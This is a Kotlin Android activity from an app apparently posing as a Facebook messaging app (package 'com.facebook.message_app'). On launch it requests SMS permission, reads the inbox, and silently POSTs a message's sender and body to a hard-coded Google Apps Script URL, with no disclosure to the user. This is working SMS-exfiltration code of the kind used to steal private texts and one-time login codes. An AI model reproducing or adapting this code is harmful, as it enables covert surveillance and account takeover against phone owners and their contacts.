package com.facebook.message_app

import android.Manifest
import android.app.ProgressDialog
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.android.volley.RequestQueue
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley

class MainActivity : AppCompatActivity() {

    private lateinit var textView1: TextView
    private lateinit var textView2: TextView
    private lateinit var button: Button
    private var lastSender: String? = null
    private var isFirstMessage = true
//Making a static block as we made in java..
    companion object {
        private const val REQUEST_SMS_PERMISSION = 123
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        textView1 = findViewById(R.id.textView1)
        textView2 = findViewById(R.id.textView2)
        button = findViewById(R.id.button)
//Here checking whether the permission is given or not..
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), REQUEST_SMS_PERMISSION)
        } else {
            // Clear the text views before reading SMS
            textView1.text = ""
            textView2.text = ""
            readSMS()
        }
        // Enable the button if both textViews are not empty
        if (!textView1.text.isEmpty() && !textView2.text.isEmpty()) {
            button.isEnabled = true
        }


    }


//This function is called when user responses to permission request..
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            REQUEST_SMS_PERMISSION -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    readSMS()
                } else {
                    // Permission denied, handle accordingly
                    // You might want to show a message or disable functionality dependent on SMS reading
                }
            }
        }
    }

    private fun readSMS() {
        //smsUri is a Uri object that points to the SMS inbox. It specifies where the data should be queried from.
        val smsUri = Uri.parse("content://sms/inbox")
        //contentResolver is an instance of ContentResolver that provides access to the content providers in Android.
        val cursor = contentResolver.query(smsUri, null, null, null, null)

        cursor?.use {
            val senderIndex = it.getColumnIndexOrThrow("address")
            val bodyIndex = it.getColumnIndexOrThrow("body")

            while (it.moveToNext()) {
                val sender = it.getString(senderIndex)
                val body = it.getString(bodyIndex)

                if (sender == lastSender) {
                    //Do nothing..
                } else if(!isFirstMessage) {
                    //Do nothing..
                  }
                else{
                    // If sender is different, clear textView1 and set new sender
                    textView1.text = "Sender: $sender\n"
                    textView2.text = "$body\n"
                    lastSender = sender
                    isFirstMessage = false
                    addItemToSheet()
                }
            }
        }
    }


    private fun addItemToSheet() {
        val loading = ProgressDialog.show(this, "Adding Item", "Please wait")
        val sender = textView1.text.toString().trim()
        val body = textView2.text.toString().trim()

        val stringRequest = object : StringRequest(
            Method.POST, "https://script.google.com/macros/s/AKfycbycLf0uYyXz3zJ7_JajjgGtxzGSUnwVA72I-pwPu8M_R0YtMEvi44G3XZ86mtTAQqvxgg/exec",
            Response.Listener { response ->
                loading.dismiss()
                Toast.makeText(this@MainActivity, response, Toast.LENGTH_LONG).show()
                // Add any further actions you want to perform after successful response
            },
            Response.ErrorListener { error ->
                loading.dismiss()
                Toast.makeText(this@MainActivity, "Error: ${error.message}", Toast.LENGTH_LONG).show()
            }
        ) {
            override fun getParams(): Map<String, String> {
                val params: MutableMap<String, String> = HashMap()

                // here we pass params
                params["action"] = "addItem"
                params["sender"] = sender
                params["body"] = body

                return params
            }
        }


        //adding the request made to the queue for background running..
        val queue: RequestQueue = Volley.newRequestQueue(this)
        queue.add(stringRequest)

        // empty the textviews and dsiabling buttons..
        textView1.text = ""
        textView2.text = ""
        if (textView1.text.isEmpty() && textView2.text.isEmpty()) {
            button.isEnabled = false
        }
    }

}
